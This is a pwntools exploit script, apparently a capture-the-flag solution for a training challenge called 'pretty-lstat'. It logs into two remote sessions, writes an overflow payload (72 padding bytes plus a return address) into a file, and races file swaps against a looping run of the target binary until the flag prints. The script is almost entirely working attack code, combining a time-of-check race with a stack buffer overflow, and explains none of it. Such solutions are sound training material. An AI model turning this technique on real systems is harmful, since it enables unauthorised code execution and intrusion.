from pwn import *

def get_token(c):
    c.recvuntil(b'token: ')
    return c.recvline().strip()

p1 = remote('pretty-lstat.training.offensivedefensive.it', 8080, ssl = True)
token = get_token(p1)

p2 = remote('private.training.offensivedefensive.it', 8080, ssl = True)
p2.recvuntil(b'Token: ')
p2.sendline(token)

p3 = remote('private.training.offensivedefensive.it', 8080, ssl = True)
p3.recvuntil(b'Token: ')
p3.sendline(token)

p2.sendline(b'cd home/user')
p3.sendline(b'cd home/user')
p2.sendline(b'export FLAG_PATH=/flag')

p2.sendline(b'echo -ne Hello World! > hello.txt')
p2.sendline(b'echo -ne "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" >> exploit.txt')
p2.sendline(b'echo -ne "\\x96\\x12\\x40\\x00\\x00\\x00\\x00\\x00" >> exploit.txt')
p2.sendline(b'echo -ne Hello World! > data.txt')
p2.sendline(b'cat exploit.txt')

p2.sendline(b'while true; do ./pretty_lstat data.txt data.txt; done')
p3.sendline(b'while true; do cp hello.txt data.txt; cp exploit.txt data.txt; done')

while(1):
    output = p2.recvline()
    if b'Flag' in output:
        print(output)
        #break
    

#p2.interactive()